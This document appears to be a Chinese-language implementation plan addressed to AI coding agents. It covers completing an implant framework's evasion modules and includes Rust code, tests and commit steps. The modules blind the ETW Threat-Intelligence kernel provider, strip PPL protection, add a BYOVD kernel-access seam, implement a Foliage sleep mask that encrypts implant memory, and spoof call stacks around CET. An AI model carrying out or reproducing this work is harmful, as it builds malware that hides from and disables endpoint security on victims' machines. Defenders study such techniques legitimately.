# Bypass 模块彻底完善 — 实现计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 把 P2 用户态 + 内核 tier 的全部 bypass 模块补全到"算法核心本机可测 + Windows 外壳交叉 check 通过 + 真机验证清单就绪"。

**Architecture:** 三层分离——纯算法核心（`implant-evasionsdk` 新增 foliage/apc/swap + `operator-kernelsdk` 去门控让 mock 测试本机跑）→ Windows 外壳（`implant-win` 喂 live syscall，全 gated OFF）→ 真机验证清单（脚本，本会话不执行）。单一数学真源；默认安全（破坏性能力默认 OFF/idempotent）。

**Tech Stack:** Rust no_std (core/alloc)、间接 syscall runtime、RC4 (`SystemFunction032`)、mock `KernelRw` (`spin::Mutex`)、nightly + `x86_64-pc-windows-gnu` 交叉 check。

**Spec:** `docs/superpowers/specs/2026-06-24-bypass-modules-completion-design.md`（已批准，commit `c530fd3`）。

**诚实边界:** 本机只做单元测试（macOS）+ 交叉 `cargo check --target x86_64-pc-windows-gnu`。任何"已验证的绕过"声明留待真机执行。不加载驱动，不运行扫描器。

---

## 文件结构

**新建:**
- `crates/implant-evasionsdk/src/foliage.rs` — Foliage 10 步睡眠链纯状态机（no_std，本机可测）
- `crates/implant-evasionsdk/src/apc.rs` — APC/NtContinue 链合成纯模型（no_std，本机可测）
- `crates/implant-evasionsdk/src/swap.rs` — CET-aware RSP-swap 决策纯逻辑（no_std，本机可测）
- `crates/implant-win/src/sleep.rs` — Foliage 的 syscall 执行器（win-only, gated）
- `docs/p2-real-machine-validation-checklist.md` — Windows 真机验证执行清单

**修改:**
- `crates/operator-kernelsdk/src/lib.rs:47` — 去掉 crate 顶部门控
- `crates/operator-kernelsdk/src/etwti.rs:190-191` + `telemetry.rs:223-224` + `persistence.rs:195-196` — mock 测试 `std`→`alloc`/`spin`
- `crates/operator-kernelsdk/Cargo.toml` — 加 `spin` dev-dependency
- `crates/implant-evasionsdk/src/lib.rs` — 注册 3 个新模块
- `crates/implant-win/src/kits.rs:51` — `NoMask`→`Foliage`（gated）
- `crates/implant-win/src/stack.rs:239-260` — RSP swap 实现（CET-aware, gated）
- `crates/implant-win/src/mem.rs` — 接 `.text` mask
- `crates/implant-win/src/blind.rs` — provider-disable 双保险
- `crates/implant-win/src/inject.rs:177-191` — stomp 算法骨架（gated）
- `crates/implant-win/src/evasion_glue.rs` — 谓词加固 + trait 接线
- `crates/implant-win/src/selftests.rs` — 新增 foliage/swap 自检导出
- `scripts/run_all_selftests.ps1` — 增 foliage/swap 测试项
- `scripts/scan_linger.ps1` — 增 foliage 场景

**依赖关系:** K1→K2→K3（内核线，串行）；U1→U2,U1→U4,U3→U6（用户态线，部分串行）；两线彼此独立可并行；所有变完成后 F1-F3。

---

## 线 K — 内核 crate 解锁（让 24 个 mock 测试本机可跑）

### Task K1: 去掉 operator-kernelsdk crate 顶部门控

**Files:**
- Modify: `crates/operator-kernelsdk/src/lib.rs:47`
- Modify: `crates/operator-kernelsdk/Cargo.toml`

- [ ] **Step 1: 写下期望的测试基线（验证当前 0 测试）**

Run:
```bash
cargo test --manifest-path crates/operator-kernelsdk/Cargo.toml 2>&1 | tail -5
```
Expected: `running 0 tests` / `test result: ok. 0 passed`（crate 被 windows 门控，macOS 编译成空）

- [ ] **Step 2: 修改 Cargo.toml，加 spin dev-dependency（无 std Mutex）**

在 `crates/operator-kernelsdk/Cargo.toml` 末尾追加：
```toml

[dev-dependencies]
# no_std Mutex for the mock KernelRw in tests (replaces std::sync::Mutex so the
# crate's mock tests compile + run on the macOS dev host without std).
spin = { version = "0.9", default-features = false, features = ["spin_mutex"] }
```

- [ ] **Step 3: 修改 lib.rs 顶部，去掉 windows 门控，改为 no_std + alloc**

把 `crates/operator-kernelsdk/src/lib.rs:47-50` 这段：
```rust
#![cfg(target_os = "windows")]
#![forbid(unsafe_op_in_unsafe_fn)]

extern crate alloc;
```
改为：
```rust
#![cfg_attr(not(test), no_std)]
#![forbid(unsafe_op_in_unsafe_fn)]

extern crate alloc;
```
保留下方所有 `use alloc::string::String;` 等。trait 定义本身不依赖 windows API。

- [ ] **Step 4: 改 etwti.rs 测试的 std→alloc/spin**

把 `crates/operator-kernelsdk/src/etwti.rs:189-196` 这段：
```rust
    use super::*;
    use crate::KrwError;
    use std::collections::BTreeMap;
    use std::sync::Mutex;

    /// A mock KernelRw over a Mutex-protected sparse byte map. Send+Sync (Mutex),
    struct MockKrw(Mutex<BTreeMap<usize, u8>>);
```
改为：
```rust
    use super::*;
    use crate::KrwError;
    use alloc::collections::BTreeMap;
    use alloc::vec::Vec;
    use spin::mutex::Mutex;

    /// A mock KernelRw over a Mutex-protected sparse byte map. Send+Sync (Mutex),
    struct MockKrw(Mutex<BTreeMap<usize, u8>>);
```
注意 `spin::mutex::Mutex` 的 API：`lock()` 返回 `MutexGuard`（非 `Result`），所以下方所有 `self.0.lock().unwrap()` 要改为 `self.0.lock()`（去掉 `.unwrap()`）。

- [ ] **Step 5: 改 telemetry.rs + persistence.rs 测试同样替换**

`crates/operator-kernelsdk/src/telemetry.rs:222-226` 和 `persistence.rs:193-198` 做与 Step 4 完全相同的替换（`std::collections::BTreeMap`→`alloc::collections::BTreeMap`、`std::sync::Mutex`→`spin::mutex::Mutex`、去掉所有 `.lock().unwrap()` 的 `.unwrap()`）。

- [ ] **Step 6: 运行测试，验证 24 个测试全部跑起来**

Run:
```bash
cargo test --manifest-path crates/operator-kernelsdk/Cargo.toml 2>&1 | tail -15
```
Expected: `running 24 tests`，全部 `ok`，`test result: ok. 24 passed; 0 failed`。（若个别测试因 `spin` Mutex API 差异失败，按编译错误修正 `.unwrap()` 残留。）

- [ ] **Step 7: 交叉 check 确认 windows 仍编译（未引入 std 到非测试构建）**

Run:
```bash
cargo +nightly check --manifest-path crates/operator-kernelsdk/Cargo.toml --target x86_64-pc-windows-gnu 2>&1 | tail -5
```
Expected: `Finished`（非测试构建是 no_std，windows target 下 lib 仍能 check 通过）

- [ ] **Step 8: Commit**

```bash
git add crates/operator-kernelsdk/
git commit -m "fix(kernelsdk): strip windows-only gate so 24 mock tests run on dev host

Replace #![cfg(target_os=windows)] with #![cfg_attr(not(test), no_std)] so
the crate compiles + its 24 mock KernelRw tests run on macOS. Mock tests
switch std::Mutex/BTreeMap -> spin::Mutex/alloc (no_std-compatible). Trait
defs + algorithms were never windows-dependent; only future win/ shells
stay cfg(windows)."
```

---

### Task K2: 补内核算法边界场景测试

**Files:**
- Modify: `crates/operator-kernelsdk/src/etwti.rs`（末尾 tests mod 加测试）
- Modify: `crates/operator-kernelsdk/src/byovd.rs`（末尾 tests mod 加测试）
- Modify: `crates/operator-kernelsdk/src/persistence.rs`（末尾 tests mod 加测试）

- [ ] **Step 1: 给 etwti.rs 加 HVCI 拒绝 + Win11 22H2 拒绝测试**

在 `etwti.rs` 的 `mod tests` 末尾（最后一个 `}` 前）追加：
```rust
    #[test]
    fn hvci_code_page_error_propagates_as_no_primitive() {
        // A KernelRw that refuses ALL writes (simulating HVCI code-page refusal).
        struct RefusingKrw;
        impl KernelRw for RefusingKrw {
            fn kread(&self, _: usize, _: &mut [u8]) -> Result<(), KrwError> { Ok(()) }
            fn kwrite(&self, _: usize, _: &[u8]) -> Result<(), KrwError> {
                Err(KrwError::HvciCodePage)
            }
        }
        let krw = RefusingKrw;
        // Lay out a valid pointer chain so we reach the write (which then refuses).
        // Use MockKrw for the read chain, RefusingKrw for the write — but blind
        // uses one krw for both. Simplest: a krw that reads ok but writes HvciCodePage.
        struct ReadOkWriteHvci;
        impl KernelRw for ReadOkWriteHvci {
            fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
                // Return non-null pointers so the chase proceeds to the write step.
                if dst.len() >= 8 { dst[..8].copy_from_slice(&[0x10u8; 8]); }
                Ok(())
            }
            fn kwrite(&self, _: usize, _: &[u8]) -> Result<(), KrwError> {
                Err(KrwError::HvciCodePage)
            }
        }
        let krw = ReadOkWriteHvci;
        let off = EtwTiOffsets::for_build(17763).unwrap();
        let kit = EtwTiBlind { prov_reg_handle_kva: 0x1000, offsets: off };
        let r = kit.blind(&krw);
        assert!(matches!(r, Err(KitError::NoPrimitive(KrwError::HvciCodePage))));
    }

    #[test]
    fn win11_22h2_returns_none_requiring_runtime_probe() {
        // 22621 (Win11 22H2) has no hardcoded offsets — must probe, never guess.
        assert!(EtwTiOffsets::for_build(22621).is_none());
        assert!(EtwTiOffsets::for_build_strict(22621, 1).is_none());
    }
```

- [ ] **Step 2: 运行新测试，验证通过**

Run:
```bash
cargo test --manifest-path crates/operator-kernelsdk/Cargo.toml etwti 2>&1 | tail -8
```
Expected: 之前 6 个 + 新 2 个 = 8 passed

- [ ] **Step 3: 给 persistence.rs 加 offset 越界 + PPL 全部 signer 测试**

在 `persistence.rs` 的 `mod tests` 末尾追加：
```rust
    #[test]
    fn ppl_strips_every_signer_level() {
        // Each PS_PROTECTED_SIGNER value, packed into a Level byte, must be
        // strip-able to UNPROTECTED. Exercises the full enum (WinSystem, WinTcb,
        // Antimalware, Lsa, ...).
        use crate::offsets::ps_protection;
        for signer in [
            ps_protection::SIGNER_AUTHENTICODE, ps_protection::SIGNER_CODEGEN,
            ps_protection::SIGNER_ANTIMALWARE, ps_protection::SIGNER_LSA,
            ps_protection::SIGNER_WINDOWS, ps_protection::SIGNER_WIN_TCB,
            ps_protection::SIGNER_WIN_SYSTEM,
        ] {
            let protected: u8 = ps_protection::TYPE_PROTECTED
                | (signer << ps_protection::SIGNER_SHIFT);
            assert_ne!(protected & ps_protection::TYPE_MASK, ps_protection::TYPE_NONE);
            // After stripping (write UNPROTECTED = 0), the byte is fully zero.
            let stripped = ps_protection::UNPROTECTED;
            assert_eq!(stripped & ps_protection::TYPE_MASK, ps_protection::TYPE_NONE);
            assert_eq!((stripped & ps_protection::SIGNER_MASK) >> ps_protection::SIGNER_SHIFT, 0);
        }
    }
```
（这个测试验证 PPL 剥离的数学不变量；真正的 EPROCESS 写在 persistence.rs 现有测试里已 mock。）

- [ ] **Step 4: 运行全部内核测试**

Run:
```bash
cargo test --manifest-path crates/operator-kernelsdk/Cargo.toml 2>&1 | tail -5
```
Expected: `test result: ok. 27 passed; 0 failed`（24 原有 + 3 新）

- [ ] **Step 5: Commit**

```bash
git add crates/operator-kernelsdk/src/
git commit -m "test(kernelsdk): HVCI refusal + Win11 22H2 + PPL signer boundary cases"
```

---

### Task K3: win/ 外壳占位模块 + 交叉 check

**Files:**
- Create: `crates/operator-kernelsdk/src/win.rs`
- Modify: `crates/operator-kernelsdk/src/lib.rs`（注册 win 模块）

- [ ] **Step 1: 创建 win.rs 占位（未来真实 syscall/符号绑定的归属）**

Create `crates/operator-kernelsdk/src/win.rs`:
```rust
//! Windows-specific kernel-tier shells — the place future real syscall /
//! symbol-resolution bindings land. Currently empty: the algorithms in the
//! sibling modules (etwti, byovd, telemetry, persistence, netsec, offsets)
//! are platform-agnostic given a `&dyn KernelRw`; this module holds the
//! Windows-only glue that PRODUCES a `KernelRw` (BYOVD driver IOCTL binding,
//! KslD.sys bootstrap, DMA channel, driverless CVE) + symbol resolution
//! (`MmGetSystemRoutineAddress` for `EtwThreatIntProvRegHandle`, PDB RVA
//! lookup for Ps*NotifyRoutine arrays).
//!
//! ## Why it exists but is empty
//! Loading a kernel driver is operator-side + irreversible (BSOD risk) +
//! Defender-flagging. The real impls land only for an authorized target.
//! This module is the documented home so future work has a clear seam.

#![cfg(target_os = "windows")]
```

- [ ] **Step 2: 在 lib.rs 注册 win 模块**

在 `crates/operator-kernelsdk/src/lib.rs` 的 `pub mod netsec;`（约 line 83）之后追加：
```rust
/// Windows-specific kernel-tier shells (BYOVD/KslD/DMA `KernelRw` impls +
/// symbol resolution). Empty for now — algorithms live in the sibling modules;
/// this is where the Windows-only bootstrap lands.
#[cfg(target_os = "windows")]
pub mod win;
```

- [ ] **Step 3: 本机 check（非 win，win 模块被 cfg 掉）+ 交叉 check（win）**

Run:
```bash
cargo check --manifest-path crates/operator-kernelsdk/Cargo.toml 2>&1 | tail -3
cargo +nightly check --manifest-path crates/operator-kernelsdk/Cargo.toml --target x86_64-pc-windows-gnu 2>&1 | tail -3
```
Expected: 两个都 `Finished`

- [ ] **Step 4: Commit**

```bash
git add crates/operator-kernelsdk/src/win.rs crates/operator-kernelsdk/src/lib.rs
git commit -m "feat(kernelsdk): add win/ shell module (future BYOVD/KslD/DMA KernelRw home)"
```

---

## 线 U — 用户态（SDK 纯核心先行，本机可测）

### Task U1: foliage.rs — Foliage 10 步睡眠链纯状态机

**Files:**
- Create: `crates/implant-evasionsdk/src/foliage.rs`
- Modify: `crates/implant-evasionsdk/src/lib.rs`（注册 module）

- [ ] **Step 1: 写失败测试 — FoliagePlan::build 产出正确步骤顺序**

Create `crates/implant-evasionsdk/src/foliage.rs`（先只写测试 + 最小骨架）：
```rust
//! Foliage sleep-mask 10-step APC→NtContinue chain — pure state-machine model.
//!
//! The Windows Foliage sleep obfuscation (Kyle Avery, DEF CON 30, first-hand)
//! queues a chain of APCs that each call `NtContinue(ctx)` to walk the beacon
//! thread through a mask→sleep→unmask cycle WITHOUT the beacon thread itself
//! executing through the encrypted region. This module models that cycle as
//! pure data — a `FoliagePlan` describing each step — so the step ordering,
//! invariant (image byte-identical on return), and RC4 round-trip are unit-
//! testable on the host with no Windows API.
//!
//! ## Single-source-of-truth
//! The RC4 math lives in [`crate::rc4`]; this module calls it, never
//! reimplements it. The APC chain layout lives in [`crate::apc`] (Task U2).

#![cfg_attr(not(test), allow(dead_code))]

extern crate alloc;
use alloc::vec::Vec;

/// Which crypto the chain uses for the mask/unmask steps.
/// `SystemFunction032` is image-commit (advapi32), Moneta-clean; preferred.
/// `KsecDD` is the `\Device\KsecDD` ioctl path (the original Foliage).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum CryptoMethod {
    SystemFunction032,
    KsecDD,
}

/// One step of the Foliage chain. The order in `FoliagePlan::steps` IS the
/// execution order. Each variant names the syscall class + its semantic;
/// the live executor (implant-win/sleep.rs) maps each to an indirect syscall.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum FoliageStep {
    /// Wait on an event to keep the helper thread alive (step 1).
    WaitForEvent,
    /// Implant memory RX→RW (step 2). `region_base`/`region_len` target .text.
    Protect { from_perm: u32, to_perm: u32 },
    /// Encrypt the region (step 3). Method = plan.crypto.
    Encrypt,
    /// Save the original thread CONTEXT (step 4).
    GetContext,
    /// Set a spoofed CONTEXT with RIP = `spoof_rip` (step 5).
    SetContext { spoof_rip: u64 },
    /// The actual sleep (step 6). wait-reason = UserRequest (dodges HSB).
    Sleep { seconds: u32 },
    /// Decrypt the region (step 7).
    Decrypt,
    /// Restore the original CONTEXT (step 8).
    RestoreContext,
    /// Implant memory RW→RX (step 9).
    Unprotect,
    /// Terminate the helper thread (step 10).
    Terminate,
}

/// A fully-specified Foliage sleep cycle. Built once per sleep; the executor
/// walks `steps` in order, mapping each to an indirect syscall.
#[derive(Clone, Debug)]
pub struct FoliagePlan {
    pub steps: Vec<FoliageStep>,
    pub crypto: CryptoMethod,
    /// The RC4 key for Encrypt/Decrypt (SystemFunction032 path). 16 bytes
    /// matches SystemFunction032's USTRING convention; the key is per-sleep
    /// (non-secret — only needs determinism across mask/restore).
    pub key: [u8; 16],
    pub region_base: usize,
    pub region_len: usize,
}

/// x64 memory protection constants (winnt.h PAGE_*).
pub const PAGE_READONLY: u32 = 0x02;
pub const PAGE_READWRITE: u32 = 0x04;
pub const PAGE_EXECUTE_READ: u32 = 0x20;
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;

impl FoliagePlan {
    /// Build a canonical 10-step Foliage plan for `seconds` of sleep over the
    /// region `[region_base, region_base+region_len)`. `spoof_rip` is the
    /// fake return address (a .pdata gap address) for the spoofed CONTEXT;
    /// None leaves the context untouched (no stack spoof during sleep).
    pub fn build(
        region_base: usize,
        region_len: usize,
        seconds: u32,
        spoof_rip: Option<u64>,
        key: [u8; 16],
    ) -> Self {
        // The 10 steps in fixed Foliage order. Protect steps flip RX↔RW;
        // the spoof step is conditional on spoof_rip.
        let mut steps = alloc::vec![
            FoliageStep::WaitForEvent,
            FoliageStep::Protect { from_perm: PAGE_EXECUTE_READ, to_perm: PAGE_READWRITE },
            FoliageStep::Encrypt,
            FoliageStep::GetContext,
        ];
        match spoof_rip {
            Some(rip) => steps.push(FoliageStep::SetContext { spoof_rip: rip }),
            None => {} // no spoof during sleep — context left as-is
        }
        steps.push(FoliageStep::Sleep { seconds });
        steps.push(FoliageStep::Decrypt);
        steps.push(FoliageStep::RestoreContext);
        steps.push(FoliageStep::Protect { from_perm: PAGE_READWRITE, to_perm: PAGE_EXECUTE_READ });
        steps.push(FoliageStep::Terminate);
        Self { steps, crypto: CryptoMethod::SystemFunction032, key, region_base, region_len }
    }

    /// The number of steps in the chain (10 with spoof, 9 without).
    pub fn step_count(&self) -> usize { self.steps.len() }

    /// True iff the plan's protect steps are balanced (every RX→RW has a
    /// matching RW→RX), so the region is executable again on return.
    pub fn protections_are_balanced(&self) -> bool {
        let mut depth = 0i32;
        for s in &self.steps {
            if let FoliageStep::Protect { to_perm, .. } = s {
                if *to_perm == PAGE_READWRITE { depth += 1; }
                if *to_perm == PAGE_EXECUTE_READ { depth -= 1; }
            }
        }
        depth == 0
    }
}

/// Encrypt `buf` in place with `key` (RC4). Delegates to crate::rc4.
pub fn mask_region(key: &[u8], buf: &mut [u8]) {
    crate::rc4::Rc4::apply_oneshot(key, buf);
}

/// Decrypt == encrypt for RC4 (XOR stream cipher). Same call.
pub fn unmask_region(key: &[u8], buf: &mut [u8]) {
    crate::rc4::Rc4::apply_oneshot(key, buf);
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn build_with_spoof_has_10_steps_in_correct_order() {
        let plan = FoliagePlan::build(0x1000, 0x2000, 5, Some(0xDEAD_BEEF), [0xAB; 16]);
        assert_eq!(plan.step_count(), 10);
        // Order: WaitForEvent, Protect(RX→RW), Encrypt, GetContext, SetContext,
        //        Sleep, Decrypt, RestoreContext, Protect(RW→RX), Terminate
        assert!(matches!(plan.steps[0], FoliageStep::WaitForEvent));
        assert!(matches!(plan.steps[1], FoliageStep::Protect { to_perm: PAGE_READWRITE, .. }));
        assert!(matches!(plan.steps[2], FoliageStep::Encrypt));
        assert!(matches!(plan.steps[3], FoliageStep::GetContext));
        assert!(matches!(plan.steps[4], FoliageStep::SetContext { spoof_rip: 0xDEAD_BEEF }));
        assert!(matches!(plan.steps[5], FoliageStep::Sleep { seconds: 5 }));
        assert!(matches!(plan.steps[6], FoliageStep::Decrypt));
        assert!(matches!(plan.steps[7], FoliageStep::RestoreContext));
        assert!(matches!(plan.steps[8], FoliageStep::Protect { to_perm: PAGE_EXECUTE_READ, .. }));
        assert!(matches!(plan.steps[9], FoliageStep::Terminate));
    }

    #[test]
    fn build_without_spoof_has_9_steps() {
        let plan = FoliagePlan::build(0x1000, 0x2000, 5, None, [0xAB; 16]);
        assert_eq!(plan.step_count(), 9);
        // No SetContext step present.
        assert!(!plan.steps.iter().any(|s| matches!(s, FoliageStep::SetContext { .. })));
    }

    #[test]
    fn protections_are_balanced_with_spoof() {
        let plan = FoliagePlan::build(0x1000, 0x2000, 5, Some(0xDEAD), [0xAB; 16]);
        assert!(plan.protections_are_balanced());
    }

    #[test]
    fn mask_unmask_round_trip_restores_bytes() {
        let key = [0x11u8; 16];
        let original = *b"Foliage-RC4-roundtrip-test!!"; // 27 bytes
        let mut buf = original;
        mask_region(&key, &mut buf);
        assert_ne!(buf, original, "mask did not change the buffer");
        unmask_region(&key, &mut buf);
        assert_eq!(buf, original, "unmask did not restore the original");
    }

    #[test]
    fn crypto_defaults_to_system_function_032() {
        let plan = FoliagePlan::build(0x1000, 0x2000, 5, None, [0; 16]);
        assert_eq!(plan.crypto, CryptoMethod::SystemFunction032);
    }
}
```

- [ ] **Step 2: 在 lib.rs 注册 foliage module**

在 `crates/implant-evasionsdk/src/lib.rs` 的 `pub mod rc4;`（约 line 60）之后加：
```rust
/// Foliage sleep-mask 10-step APC→NtContinue chain — pure state-machine model.
pub mod foliage;
```

- [ ] **Step 3: 运行测试，验证通过**

Run:
```bash
cargo test --manifest-path crates/implant-evasionsdk/Cargo.toml foliage 2>&1 | tail -10
```
Expected: `running 5 tests`，全 `ok`（之前已有 foliage 测试在内，total 应 29）

- [ ] **Step 4: 运行全套确认无回归**

Run:
```bash
cargo test --manifest-path crates/implant-evasionsdk/Cargo.toml 2>&1 | tail -3
```
Expected: `test result: ok. 29 passed`（24 原有 + 5 foliage）

- [ ] **Step 5: Commit**

```bash
git add crates/implant-evasionsdk/src/foliage.rs crates/implant-evasionsdk/src/lib.rs
git commit -m "feat(evasionsdk): foliage.rs — Foliage 10-step sleep-mask state machine

Pure no_std model of the Foliage APC chain (Kyle Avery DEF CON 30): step
ordering, RX↔RW protection balance invariant, SystemFunction032 RC4
round-trip. 5 unit tests, host-runnable. Live syscall executor lands in
implant-win/sleep.rs (Task U4)."
```

---

### Task U2: apc.rs — APC/NtContinue 链合成纯模型

**Files:**
- Create: `crates/implant-evasionsdk/src/apc.rs`
- Modify: `crates/implant-evasionsdk/src/lib.rs`

- [ ] **Step 1: 写失败测试 + 实现一起（TDD：先写测试看到失败，再补实现）**

Create `crates/implant-evasionsdk/src/apc.rs`:
```rust
//! APC / NtContinue chain synthesis — pure model of how Foliage/Ekko queue
//! `NtContinue(ctx)` APCs to walk a thread through a multi-step context dance.
//!
//! In the real technique (Foliage: `NtQueueApcThread`; Ekko: `CreateTimerQueue
//! Timer`), each queued callback invokes `NtContinue(&CONTEXT, FALSE)` to
//! install a new thread CONTEXT — driving the sequence: save→spoof→sleep→
//! restore→... without the thread's own instruction stream touching any of it.
//!
//! This module models the chain as pure data: given a list of target RIPs
//! (the spoof frame addresses from the GapPool), produce the ordered list of
//! `NtContinue` APC descriptors. The live executor resolves the syscall
//! numbers + CONTEXT field layout; here we only validate the structure.

#![cfg_attr(not(test), allow(dead_code))]

extern crate alloc;
use alloc::vec::Vec;
use crate::GapPool;

/// One queued `NtContinue(&ctx)` APC in the chain. `target_rip` is the RIP
/// field of the manufactured CONTEXT the APC will install.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct ApcFrame {
    pub target_rip: u64,
    /// Depth index (0 = outermost / first queued, executes last). The Foliage
    /// chain queues in reverse so the innermost (most-recent) context is the
    /// one the thread resumes into first.
    pub queue_index: usize,
}

/// An ordered APC chain: frames[0] is queued first (executes last in the
/// LIFO APC queue), frames[last] is queued last (executes first).
#[derive(Clone, Debug)]
pub struct ApcChain {
    pub frames: Vec<ApcFrame>,
}

impl ApcChain {
    /// Build an APC chain of `depth` frames, drawing leaf-gap addresses from
    /// `pool.gaps` (the .pdata gap addresses — CET-safe leaf frames). Returns
    /// an empty chain if the pool has no gaps (caller degrades to no-spoof).
    pub fn build(depth: usize, pool: &GapPool) -> Self {
        let mut frames = Vec::new();
        if pool.gaps.is_empty() {
            return Self { frames };
        }
        for i in 0..depth {
            // Round-robin the gaps so consecutive frames don't share an addr.
            let gap = pool.gaps[i % pool.gaps.len()] as u64;
            frames.push(ApcFrame { target_rip: gap, queue_index: i });
        }
        Self { frames }
    }

    /// Chain depth (number of NtContinue APCs). 0 = no chain (degrade).
    pub fn depth(&self) -> usize { self.frames.len() }

    /// True iff every frame's target_rip is non-zero (a coarse validity
    /// check; the real leaf-legal property is RtlLookupFunctionEntry==NULL,
    /// which only the kernel confirms at runtime).
    pub fn looks_valid(&self) -> bool {
        !self.frames.is_empty() && self.frames.iter().all(|f| f.target_rip != 0)
    }

    /// The RIP the thread resumes into FIRST (the last-queued frame).
    pub fn entry_rip(&self) -> Option<u64> {
        self.frames.last().map(|f| f.target_rip)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn pool_with_gaps(n: usize) -> GapPool {
        let gaps = (1..=n).map(|i| 0x1000_0000 + i * 0x10).collect();
        GapPool { gaps, ghosts: alloc::vec![], nops: alloc::vec![] }
    }

    #[test]
    fn build_yields_requested_depth() {
        let pool = pool_with_gaps(20);
        let chain = ApcChain::build(8, &pool);
        assert_eq!(chain.depth(), 8);
    }

    #[test]
    fn empty_pool_yields_empty_chain() {
        let pool = GapPool::default();
        let chain = ApcChain::build(8, &pool);
        assert_eq!(chain.depth(), 0);
        assert!(!chain.looks_valid());
    }

    #[test]
    fn fewer_gaps_than_depth_round_robins() {
        // 3 gaps, depth 8 → the 3 gaps repeat round-robin.
        let pool = pool_with_gaps(3);
        let chain = ApcChain::build(8, &pool);
        assert_eq!(chain.depth(), 8);
        // frame[0] and frame[3] and frame[6] share the same gap (index 0).
        assert_eq!(chain.frames[0].target_rip, chain.frames[3].target_rip);
        assert_eq!(chain.frames[3].target_rip, chain.frames[6].target_rip);
    }

    #[test]
    fn looks_valid_when_all_nonzero() {
        let pool = pool_with_gaps(8);
        let chain = ApcChain::build(8, &pool);
        assert!(chain.looks_valid());
    }

    #[test]
    fn entry_rip_is_last_queued_frame() {
        let pool = pool_with_gaps(8);
        let chain = ApcChain::build(5, &pool);
        assert_eq!(chain.entry_rip(), Some(chain.frames[4].target_rip));
    }
}
```

- [ ] **Step 2: 在 lib.rs 注册 apc module**

在 `pub mod foliage;` 之后加：
```rust
/// APC / NtContinue chain synthesis — pure model for Foliage/Ekko.
pub mod apc;
```

- [ ] **Step 3: 运行测试**

Run:
```bash
cargo test --manifest-path crates/implant-evasionsdk/Cargo.toml apc 2>&1 | tail -8
```
Expected: 5 apc 测试全 `ok`，total `34 passed`

- [ ] **Step 4: Commit**

```bash
git add crates/implant-evasionsdk/src/apc.rs crates/implant-evasionsdk/src/lib.rs
git commit -m "feat(evasionsdk): apc.rs — APC/NtContinue chain synthesis pure model"
```

---

### Task U3: swap.rs — CET-aware RSP-swap 决策纯逻辑

**Files:**
- Create: `crates/implant-evasionsdk/src/swap.rs`
- Modify: `crates/implant-evasionsdk/src/lib.rs`

- [ ] **Step 1: 写失败测试 + 实现**

Create `crates/implant-evasionsdk/src/swap.rs`:
```rust
//! CET-aware RSP-swap decision — pure logic.
//!
//! Intel CET / the Windows kernel shadow stack acts at every `ret`: the CPU
//! pops from RSP AND from the shadow stack, faulting (#CP) on mismatch. A
//! naive RSP swap that moves the stack onto a fake chain of gap addresses
//! will fault on CET-on hosts, because those addresses were never pushed by
//! a real `call`. (The .pdata gap technique is CET-safe at the UNWINDER/
//! detection layer, NOT at the `ret` execution layer — see stack.rs docs.)
//!
//! This module is the pure decision: given the runtime posture (CET on? gaps
//! usable?), decide whether to EXECUTE the swap or DEGRADE. The decision is
//! deliberately pessimistic — when in doubt, degrade (never risk a #CP).

#![cfg_attr(not(test), allow(dead_code))]

/// The swap decision returned by [`decide`].
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum SwapDecision {
    /// Safe to execute the RSP swap (CET off + gaps usable).
    Execute,
    /// Degrade to the no-swap floor. Carries the reason for diagnostics.
    Degrade(&'static str),
}

/// Decide whether to execute the RSP swap given the runtime posture.
///
/// - `cet_on`: is user-mode CET / shadow stack active for this process?
///   (Win11 24H2+ opt-in per-process; probe at runtime in the live impl.)
/// - `gaps_usable`: did the PdataGapScanner yield a non-empty GapPool?
///
/// Returns `Execute` only when BOTH CET is off AND gaps are usable. Any other
/// combination degrades with a specific reason.
pub fn decide(cet_on: bool, gaps_usable: bool) -> SwapDecision {
    if cet_on {
        return SwapDecision::Degrade("CET/shadow-stack active — RSP swap would #CP");
    }
    if !gaps_usable {
        return SwapDecision::Degrade("no .pdata gaps — nothing to spoof onto");
    }
    SwapDecision::Execute
}

/// Convenience: is the decision to execute?
pub fn should_execute(cet_on: bool, gaps_usable: bool) -> bool {
    matches!(decide(cet_on, gaps_usable), SwapDecision::Execute)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn cet_off_gaps_usable_executes() {
        assert_eq!(decide(false, true), SwapDecision::Execute);
    }

    #[test]
    fn cet_on_degrades_even_if_gaps_usable() {
        // CET takes precedence — never risk a #CP even with good gaps.
        assert_eq!(
            decide(true, true),
            SwapDecision::Degrade("CET/shadow-stack active — RSP swap would #CP")
        );
    }

    #[test]
    fn no_gaps_degrades_even_if_cet_off() {
        assert_eq!(
            decide(false, false),
            SwapDecision::Degrade("no .pdata gaps — nothing to spoof onto")
        );
    }

    #[test]
    fn both_bad_degrades_with_cet_reason_first() {
        // CET is checked first → its reason wins.
        assert_eq!(
            decide(true, false),
            SwapDecision::Degrade("CET/shadow-stack active — RSP swap would #CP")
        );
    }

    #[test]
    fn should_execute_helper_matches_decide() {
        assert!(should_execute(false, true));
        assert!(!should_execute(true, true));
        assert!(!should_execute(false, false));
    }
}
```

- [ ] **Step 2: 在 lib.rs 注册 swap module**

在 `pub mod apc;` 之后加：
```rust
/// CET-aware RSP-swap decision — pure logic (pessimistic degrade).
pub mod swap;
```

- [ ] **Step 3: 运行测试**

Run:
```bash
cargo test --manifest-path crates/implant-evasionsdk/Cargo.toml swap 2>&1 | tail -8
```
Expected: 5 swap 测试全 `ok`，total `39 passed`

- [ ] **Step 4: Commit**

```bash
git add crates/implant-evasionsdk/src/swap.rs crates/implant-evasionsdk/src/lib.rs
git commit -m "feat(evasionsdk): swap.rs — CET-aware RSP-swap decision (pessimistic degrade)"
```

---

### Task U3.5: syscalls.rs — 补 syscall5 + nt_protect_virtual_memory

